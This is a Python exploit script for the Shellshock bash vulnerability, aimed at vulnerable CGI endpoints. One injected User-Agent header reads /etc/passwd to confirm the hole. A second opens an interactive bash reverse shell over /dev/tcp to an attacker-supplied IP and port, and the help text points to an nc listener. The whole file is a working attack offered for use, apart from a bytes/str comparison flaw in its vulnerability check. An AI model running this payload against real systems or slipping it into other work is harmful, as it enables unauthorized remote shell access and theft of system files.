#!/usr/bin/python3

###############################
#  http://github.com/r4v10l1  #
###############################

import sys
import requests
import time
from colorama import Fore as fore, Back as back, Style


def default_msg():

    print("{}{}[*] Shellshock Exploit ({}Reverse shell{}{})".format(fore.BLUE, Style.BRIGHT, Style.DIM, Style.NORMAL, Style.BRIGHT))
    print("[*] Usage: {}{} <Victim IP> <Vulnerable .cgi path> <Your IP> <Reverse Shell Port>{}".format(fore.WHITE, sys.argv[0], fore.BLUE))
    print("[*]")
    print("[*] Example: {}shellshock.py 192.168.1.X /here/your.cgi 127.0.0.1 4444{}".format(fore.WHITE, fore.BLUE))
    print("[*] Listener: {}nc -lvp <port>{}{}".format(fore.WHITE, fore.BLUE, Style.RESET_ALL))
    print()
    sys.exit()


if len(sys.argv) == 1:
    print()
    default_msg()
elif len(sys.argv) < 5:
    print()
    print("{}{}[!] Error, not enough arguments.{}".format(fore.RED, Style.BRIGHT, Style.RESET_ALL))
    default_msg()


# Disables request warning for cert validation ignore.
requests.packages.urllib3.disable_warnings()
ucs = sys.argv[1]
cgipath = sys.argv[2]
url = "http://" + ucs + cgipath  # HERE IS YOUR .cgi VULNERABLE PATH (example: /path/foo.cgi)
attackhost = sys.argv[3]
revshellport = sys.argv[4]
headers1 = {
    'User-Agent': '() { ignored;};/bin/bash -i >& /dev/tcp/' + attackhost + '/' + revshellport + ' 0>&1'
    }
headers2 = {
    "User-Agent": '() { test;};echo \"Content-type: text/plain\"; echo; echo; echo $(</etc/passwd)'
    }


def exploit():
    try:
        r = requests.get(url, headers=headers1, verify=False, timeout=5)
    except Exception as e:
        if 'timeout' in str(e):
            print ("{}[+] Success.  Enjoy your shell...{}".format(fore.GREEN, Style.RESET_ALL))
        else:
            print("{}[!] Something is wrong...".format(fore.RED))
            print("[!] Error: {}{}".format(Style.RESET_ALL, e))


def main():
    try:
        r = requests.get(url, headers=headers2, verify=False, timeout=3)
        if r.content.startswith('\nroot:'):
            print("{}[+] Host is vulnerable, spawning shell...{}".format(fore.GREEN, Style.RESET_ALL))
            time.sleep(3)
            exploit()
        else:
            print("{}[-] Host is not vulnerable, quitting...{}".format(fore.GREEN, Style.RESET_ALL))
            sys.exit()
    except Exception as e:
        print("{}[!] Something is wrong...".format(fore.RED))
        print("[!] Error: {}{}".format(Style.RESET_ALL, e))


if __name__ == "__main__":
    main()
